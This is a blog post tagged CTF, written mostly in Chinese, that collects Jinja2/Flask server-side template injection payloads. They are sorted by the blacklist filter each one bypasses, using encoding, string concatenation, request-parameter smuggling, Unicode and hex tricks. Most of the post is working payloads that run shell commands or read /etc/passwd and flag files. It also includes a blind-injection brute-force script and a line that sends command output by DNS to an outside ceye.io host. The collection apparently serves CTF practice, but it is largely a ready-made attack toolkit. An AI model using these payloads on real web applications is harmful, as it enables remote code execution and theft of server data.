---
title: SSTI-payload
author: CMACCKK
date: 2021-06-04 22:13:09
tags: [CTF]
---

## python3

```python
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['po' + 'pen']('whoami').read()}}
```

```python
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
```

```python
{{[].__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s')['po'+'pen']('whoami').read()}}
```

```python
{{"".__class__.__bases__[0].__subclasses__()[2].__init__[request.args.arg1]['__builtins__']['__import__']('os').popen('ls /').read()}}
&arg1=__globals__
```

```python
nickname={{()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["\x5F\x5Finit\x5F\x5F"]["\x5F\x5Fglobals\x5F\x5F"]["\x5F\x5Fbuiltins\x5F\x5F"]["\x5F\x5Fimport\x5F\x5F"]("os")["popen"]("ls /")["read"]()}}
```

## python2

```python
{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}
```

```python
{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()}}
```

## python2&&python3

```python
{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

```python
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
```

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

```python
{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

```python
{{''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()}}
```

```python
{{''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
```

```python
{{().__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].popen('whoami').read()}}
```

```python
{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}
```

```python
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
```

```python
{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
```

## 绕过黑名单

过滤了`.`

使用`[]`，`attr()`，`getattr()`来绕过点

`[]`绕过

```python
{{()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()}}
```

使用`attr()`绕过

```python
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
```

## 过滤引号

### request绕过

`GET`方式

```python
{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&arg1=open&arg2=/etc/passwd
```

`POST`方式

```python
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
post:arg1=open&arg2=/etc/passwd
```

`Cookie`方式

```python
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
Cookie:arg1=open;arg2=/etc/passwd
```

`chr`绕过

```python
{{().__class__.__base__.__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}
```

```php
<?php
$a = 'whoami';
$result = '';
for($i=0;$i<strlen($a);$i++)
{
	$result .= 'chr('.ord($a[$i]).')%2b';
}
echo substr($result,0,-3);
?>
//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)
```

最终`payload`

```python
{% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %}{{().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}
```

## 过滤下划线

编码绕过

```python
{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()}}
```

这里甚至可以全`十六进制`绕过，顺便把关键字也一起绕过，这里先给出个`python`脚本方便转换

```python
string1="__class__"
string2="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
def tohex(string):
  result = ""
  for i in range(len(string)):
      result=result+"\\x"+hex(ord(string[i]))[2:]
  print(result)

tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f
print(string2) #__class__
```

payload

```python
{{""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()}}
```

## 过滤关键字

首先要看关键字是如何被过滤的

如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过

如果直接`ban`了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下

拼接字符绕过

```python
{{()['__cla'+'ss__'].__bases__[0]}}
{{()['__cla''ss__'].__bases__[0]}}
```

```python
{{()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")}}
```

使用`join`来进行拼接

```python
{{()|attr(["_"*2,"cla","ss","_"*2]|join)}}
```

管道符加上`format`方法

```python
{{()|attr(request.args.f|format(request.args.a))}}&f=__c%sass__&a=l
```

`replace`绕过

```python
{{().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()}}
```

`decode`绕过，但这种方法经过测试只能在`python2`下使用，`payload`如下

```python
{{().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

过滤`init`，可以用`enter`或`exit`替代

```python
{{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

过滤`config`，我们通常会用`{{config}}`获取当前设置，如果被过滤了可以使用以下的`payload`绕过

```python
{{self}} ⇒ <TemplateReference None>
{{self.__dict__._TemplateReference__context}}
```

## 过滤中括号

```python
{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()}

{{().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()}}
```

```python
{{().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()}}&arg1=__class__&arg2=whoami
```

## 过滤双大括号

```python
{% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__['popen']("curl `whoami`.k1o75b.ceye.io").read()=='kawhi' %}1{% endif %}
```

然后在`ceye`平台接收数据即可

- 盲注

如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本

```python
# -*- coding: utf-8 -*-
import requests

url = 'http://ip:5000/?name='

def check(payload):
    r = requests.get(url+payload).content
    return 'kawhi' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

for i in xrange(0,100):
    for c in s:
        payload = '{% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}kawhi{% endif %}'
        if check(payload):
            password += c
            break
    print password
```

我们上面之所以要`dnslog`外带数据以及使用盲注，是因为用`{%%}`会没有回显，这里的话可以使用`print`来做一个标记使得他有回显，比如`{%print config%}`，payload如下

```python
{%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%}
```

过滤`_`和`.`和`'`

```python
{{()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")}}
```

过滤`args`和`.`和`_`

```python
{{()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])}}

post:x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('whoami').read()
```

## 导入主函数读取变量

```python
{%print request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('__main__').flag %}
```

## Unicode绕过

```python
{%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%}
```

```python
{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%}
```

然后我这里顺便给个`Unicode`互转的`php`脚本

```php
<?php
//字符串转Unicode编码
function unicode_encode($strLong) {
  $strArr = preg_split('/(?<!^)(?!$)/u', $strLong);//拆分字符串为数组(含中文字符)
  $resUnicode = '';
  foreach ($strArr as $str)
  {
      $bin_str = '';
      $arr = is_array($str) ? $str : str_split($str);//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)
      foreach ($arr as $value)
      {
          $bin_str .= decbin(ord($value));//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字"你"
      }
      $bin_str = preg_replace('/^.{4}(.{4}).{2}(.{6}).{2}(.{6})$/', '$1$2$3', $bin_str);//正则截取, $bin_str应类似0100111101100000,如果是汉字"你"
      $unicode = dechex(bindec($bin_str));//返回unicode十六进制
      $_sup = '';
      for ($i = 0; $i < 4 - strlen($unicode); $i++)
      {
          $_sup .= '0';//补位高字节 0
      }
      $str =  '\\u' . $_sup . $unicode; //加上 \u  返回
      $resUnicode .= $str;
  }
  return $resUnicode;
}
//Unicode编码转字符串方法1
function unicode_decode($name)
{
  // 转换编码，将Unicode编码转换成可以浏览的utf-8编码
  $pattern = '/([\w]+)|(\\\u([\w]{4}))/i';
  preg_match_all($pattern, $name, $matches);
  if (!empty($matches))
  {
    $name = '';
    for ($j = 0; $j < count($matches[0]); $j++)
    {
      $str = $matches[0][$j];
      if (strpos($str, '\\u') === 0)
      {
        $code = base_convert(substr($str, 2, 2), 16, 10);
        $code2 = base_convert(substr($str, 4), 16, 10);
        $c = chr($code).chr($code2);
        $c = iconv('UCS-2', 'UTF-8', $c);
        $name .= $c;
      }
      else
      {
        $name .= $str;
      }
    }
  }
  return $name;
}
//Unicode编码转字符串
function unicode_decode2($str){
  $json = '{"str":"' . $str . '"}';
  $arr = json_decode($json, true);
  if (empty($arr)) return '';
  return $arr['str'];
}
echo unicode_encode('__class__');
echo unicode_decode('\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f');
//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__
```

### 魔改字符

```
︷︷config︸︸
%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8
```

还可以使用中文的字符魔改

```
｛	&#65371;
｝	&#65373;
［	&#65339;
］	&#65341;
＇	&#65287;
＂	&#65282;
```

```python
｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝ 
```

## Hex绕过

```
{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"]}}

{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[117]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("ls")["read"]()}}

{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[117]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("cat *")["read"]()}}
```

